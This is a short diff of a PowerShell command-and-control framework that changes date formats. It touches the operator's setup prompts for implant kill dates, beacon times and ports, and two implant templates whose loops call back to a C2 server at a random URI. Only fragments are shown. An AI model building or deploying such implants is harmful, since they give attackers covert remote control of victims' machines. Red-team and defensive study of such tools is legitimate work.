@@ -937,10 +937,10 @@ netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-445
     $defaultbeacon = ($defbeacontime,$prompt)[[bool]$prompt]
 
     $killdatedefault = (get-date).AddDays(14)
-    $killdatedefault = (get-date -date $killdatedefault -Format "dd/MMM/yyyy")
+    $killdatedefault = (get-date -date $killdatedefault -Format "dd/MM/yyyy")
     $prompt = Read-Host -Prompt "[5] Enter the auto Kill Date of the implants in this format dd/MMM/yyyy [$($killdatedefault)]"
     $killdate = ($killdatedefault,$prompt)[[bool]$prompt]
-    $killdatefm = Get-Date -Date $killdate -Format "dd/MMM/yyyy"
+    $killdatefm = Get-Date -Date $killdate -Format "dd/MM/yyyy"
 
     $prompt = Read-Host -Prompt "[6] Enter the HTTP port you want to use, 80/443 is highly preferable for proxying [$($defaultserverport)]"
     $serverport = ($defaultserverport,$prompt)[[bool]$prompt]
@@ -1432,7 +1432,7 @@ $Server = "$server/'+$randomuri+'"
 $ServerClean = $Server
 while($true)
 {
-    $date = (Get-Date -Format "dd/MMM/yyyy")
+    $date = (Get-Date -Format "dd/MM/yyyy")
     $killdate = (Get-Date -Date "'+$killdatefm+'")
     if ($killdate -lt $date) {exit}
 
@@ -1657,7 +1657,7 @@ $Server = "'+$ipv4address+":"+$serverport+'/'+$randomuri+'"
 $ServerClean = "'+$ipv4address+":"+$serverport+'"
 while($true)
 {
-    $date = (Get-Date -Format "dd/MMM/yyyy")
+    $date = (Get-Date -Format "dd/MM/yyyy")
     $killdate = (Get-Date -Date "'+$killdatefm+'")
     if ($killdate -lt $date) {exit}
 
